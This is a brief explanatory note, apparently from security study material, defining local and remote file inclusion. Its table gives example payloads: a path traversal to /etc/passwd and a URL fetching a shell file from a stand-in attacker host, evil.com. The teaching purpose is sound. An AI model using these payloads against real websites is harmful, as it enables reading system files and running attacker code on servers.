File Inclusion happens when a website lets a user choose a file to load, but it doesnâ€™t check properly what the user is trying to load. This can be used by attackers to load system files, read secrets, or even run code on the server.




Type	What it does	Example
LFI	Loads local files on server	../../../../etc/passwd
RFI	Loads files from remote server	http://evil.com/shell.txt
Goal	Read files or run code on the server	RCE, data theft, etc.
